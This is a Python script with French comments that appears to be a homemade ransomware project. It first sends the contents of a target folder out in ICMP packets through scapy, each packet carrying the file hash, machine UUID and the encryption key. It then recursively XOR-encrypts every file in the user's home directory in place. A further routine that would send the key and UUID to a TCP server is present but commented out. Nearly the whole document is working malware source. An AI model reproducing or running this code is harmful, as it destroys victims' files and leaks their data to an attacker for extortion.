

import os
import socket
import uuid
import random
import string
from scapy.all import *
import hashlib
#import time


# Adresse IP du serveur
server_ip = "127.0.0.1"

# Dossier à copier
folder = "/home/chuisju/Documents/Hack"
#folder = input("Enter the folder name: ")


# Générer clé chiffrement
def generate_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase, k=length))

# Récupérer uuid machine
def get_machine_uuid():
    return str(uuid.uuid1())

# Programme principal
key = generate_key()
uuid = get_machine_uuid()

# Chiffrement XOR
def xor_cypher(input_bytes, key):
    key_bytes = key.encode()
    return bytes(input_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(input_bytes)))

# Chiffrement récursif
def encrypt_directory(directory, key):
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isdir(item_path):
            # Si l'élément est un dossier, appeler récursivement la fonction sur ce dossier
            encrypt_directory(item_path, key)
        elif os.path.isfile(item_path):
            # Si l'élément est un fichier, le traiter
            try:
                with open(item_path, "rb") as f:
                    content = f.read()
                with open(item_path, "wb") as f:
                    f.write(xor_cypher(content, key))
            except Exception as e:
                print("Erreur lors du traitement du fichier : " + item_path + ":" + str(e))
                
# Parcourir tous les éléments du dossier
for item in os.listdir(folder):
    item_path = os.path.join(folder, item)
    if os.path.isfile(item_path):
        with open(item_path, "rb") as file:
            content = file.read()

        # Calculer le hash du contenu
        content_hash = hashlib.sha256(content).hexdigest()

        # Diviser le contenu en morceaux de 1000 octets
        chunks = [content[i:i+1000] for i in range(0, len(content), 1000)]

        # Envoyer chaque morceau dans un paquet ICMP
        for sequence_number, chunk in enumerate(chunks, start=1):
            # Créer le paquet ICMP
            relative_path = os.path.relpath(item_path)
            icmp_packet = IP(dst=server_ip)/ICMP()/("bob#" + content_hash + "#" + item + "#" + relative_path + "#" + uuid + "#" + key + "#" + str(len(chunks)) + "#" + str(sequence_number) + "#" + chunk.decode(errors="ignore"))

            # Envoyer le paquet
            send(icmp_packet)

            # Afficher un message de débogage
            print("Sent packet " + str(sequence_number) + " of " + str(len(chunks)))

            # Attendre 1 seconde avant d'envoyer le prochain paquet
            #time.sleep(1)
    elif os.path.isdir(item_path):
        # Si l'élément est un dossier, appeler récursivement la fonction sur ce dossier
        encrypt_directory(item_path, key)






# Envoyer données a serveur TCP
def bob_send_data_to_server(server_ip, server_port, data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.sendall(data.encode())

# Stocker UUID localement
#def store_uuid_locally(uuid):
#    home = os.path.expanduser("~")
#    f = open(os.path.join(home, "rsm_uuid"), "w")
#    f.write(uuid)



# Chiffrement répertoire
home = os.path.expanduser("~")
encrypt_directory(home, key)

# Stockage UUID local
#store_uuid_locally(uuid)

# Envoi clé & UUID 
#bob_send_data_to_server("127.0.0.1", 12345, key + "#" + uuid)



